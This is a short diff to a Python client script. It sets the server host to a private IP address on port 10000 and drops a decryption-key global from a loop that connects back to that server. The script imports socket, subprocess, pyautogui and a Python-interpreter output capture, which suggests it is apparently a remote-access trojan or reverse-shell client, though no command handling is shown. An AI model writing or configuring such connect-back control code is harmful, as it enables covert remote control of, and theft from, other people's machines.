@@ -2,7 +2,7 @@ import socket, subprocess, os, time, platform, sys, urllib.request, re, pyautogu
 from io import StringIO # Purpose: Python Interpreter (receiving output)
 
 # Socket Properties
-HOST = ""
+HOST = "192.168.2.190"
 PORT = 10000
 buffer = 0x400
 
@@ -29,7 +29,7 @@ except: pass
 
 # Connect to Server
 def main():
-    global objSocket, DecryptionKey
+    global objSocket
 
     while (True):
         try:
